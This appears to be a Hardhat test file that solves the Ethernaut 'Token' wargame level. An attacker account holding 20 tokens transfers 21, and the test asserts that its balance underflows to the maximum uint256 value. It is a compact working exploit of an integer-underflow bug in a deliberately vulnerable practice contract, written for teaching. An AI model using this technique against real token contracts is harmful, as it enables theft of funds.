import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { expect } from "chai";
import { ethers } from "hardhat";
import { Token } from "typechain-types";

// Challenge description

// The goal of this level is for you to hack the basic token contract below.
// You are given 20 tokens to start with and you will beat the level if you
// somehow manage to get your hands on any additional tokens.
// Preferably a very large amount of tokens.

describe("Ethernaut - Token", async () => {
  let token: Token;
  let owner: SignerWithAddress, attacker: SignerWithAddress;

  before(async () => {
    [owner, attacker] = await ethers.getSigners();
    token = await ethers
      .getContractFactory("Token", owner)
      .then((f) => f.deploy(100));
  });

  it("Hacks", async () => {
    // Attacker has 20 tokens at the beginning
    await token.connect(owner).transfer(attacker.address, 20);
    expect(await token.balanceOf(attacker.address)).equal(20);

    await token.connect(attacker).transfer(owner.address, 21);
    expect(await token.balanceOf(attacker.address)).equal(
      ethers.constants.MaxUint256,
    );
  });
});
